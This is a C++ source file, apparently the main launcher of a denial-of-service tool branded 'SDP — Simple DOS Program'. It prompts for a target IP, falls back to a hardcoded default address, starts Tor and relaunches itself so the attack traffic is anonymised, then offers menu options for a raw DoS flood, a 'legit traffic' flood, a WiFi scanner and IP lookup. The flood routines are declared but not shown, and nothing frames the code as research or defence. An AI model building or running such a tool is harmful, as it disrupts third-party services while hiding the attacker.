#include <iostream>
#include <string>
#include <unistd.h>
#include <stdlib.h>
#include <algorithm>   // для std::remove_if
#include <cctype>      // для std::isspace
#include <arpa/inet.h>

extern void start_dos();
extern void wifi_scaner();
extern void IP_info();
extern void start_legit();

static std::string target_ip;

static void ask_target() {
    if (!target_ip.empty()) return;

    std::cout << "\nEnter target IP: ";
    std::string input;
    if (!std::getline(std::cin, input)) {
        target_ip = "185.34.33.2";
        std::cout << "→ Default: 185.34.33.2\n";
        return;
    }

    // Удаляем все пробелы, табы, \r, \n
    input.erase(
        std::remove_if(input.begin(), input.end(),
            [](unsigned char c) { return std::isspace(c); }),
        input.end()
    );

    if (input.empty() || inet_addr(input.c_str()) == INADDR_NONE) {
        std::cout << "Invalid IP → using 185.34.33.2\n";
        target_ip = "185.34.33.2";
    } else {
        target_ip = input;
    }
}

const char* get_ip() {
    ask_target();
    return target_ip.c_str();
}

void tor_start() {
    if (getenv("TOR")) return;
    system("tor --SocksPort 9050 --quiet & sleep 4");
    setenv("TOR", "1", 1);
    char path[1024]{};
    readlink("/proc/self/exe", path, sizeof(path));
    execve(path, const_cast<char* const*>(__environ), environ);
}

int main() {
    tor_start();
    system("clear");

    std::cout << "\033[91m";
    std::cout <<
        " /$$$$$$ /$$$$$$$ /$$$$$$$\n"
        " /$$__ $$| $$__ $$| $$__ $$\n"
        "| $$ \\__/| $$ \\ $$| $$ \\ $$\n"
        "| $$$$$$ | $$ | $$| $$$$$$$/\n"
        " \\____ $$| $$ | $$| $$____/\n"
        " /$$ \\ $$| $$ | $$| $$\n"
        "| $$$$$$/| $$$$$$$/| $$\n"
        " \\______/ |_______/ |__/\n\n";
    std::cout << "\033[0m";

    std::cout << "SDP — Simple DOS Program\n\n"
              << "1. WiFi scanner\n"
              << "2. Raw DoS\n"
              << "3. Legit traffic (most powerful)\n"
              << "4. IP info\n"
              << "5. Exit\n\n"
              << "Choice: ";

    int choice = 0;
    if (!(std::cin >> choice)) {
        std::cin.clear();
        std::cin.ignore(10000, '\n');
        choice = 5;
    }
    std::cin.ignore(10000, '\n');

    switch (choice) {
        case 1: wifi_scaner(); break;
        case 2: std::cout << "→ Raw DoS → " << get_ip() << "\n"; start_dos(); break;
        case 3: std::cout << "→ Legit traffic → " << get_ip() << "\n"; start_legit(); break;
        case 4: IP_info(); break;
        default: return 0;
    }

    pause();
    return 0;
}